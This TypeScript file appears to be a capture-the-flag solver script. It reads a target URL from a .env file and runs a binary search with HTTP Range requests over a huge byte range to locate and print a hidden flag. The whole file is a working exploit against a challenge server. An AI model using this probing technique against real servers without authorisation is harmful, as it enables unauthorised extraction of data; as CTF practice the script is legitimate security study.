import { readFileSync } from "node:fs";
import { parse } from "dotenv";

const envfile = `${import.meta.dirname}/.env`;
const config = parse(readFileSync(envfile, "utf-8"));

const url = config.CONNECT!;
const size = 0x7fffffffffffffffn;

async function main() {
  let l = BigInt("Flag is ".length);
  let r = size;

  while (l < r) {
    const m = (l + r) / 2n;
    const s = await fetchByte(m);
    if (s === "!") {
      r = m - 1n;
    } else if (s === ".") {
      l = m + 1n;
    } else {
      console.log(`s: "${s}" found at position ${m}.`);
      l = l < m - 50n ? l : m - 50n;
      r = r > m + 50n ? r : m + 50n;
      console.log(await fetchRange(l, r));
      break;
    }
    console.log(`l: ${l}, r: ${r}, m: ${m}, r-l: ${r - l}, s: ${s}`);
  }
}

async function fetchByte(pos: bigint): Promise<string> {
  return await fetchRange(pos, pos);
}

async function fetchRange(start: bigint, end: bigint): Promise<string> {
  const response = await fetch(url, {
    headers: {
      Range: `bytes=${start}-${end}`,
    },
  });
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  return await response.text();
}

main();
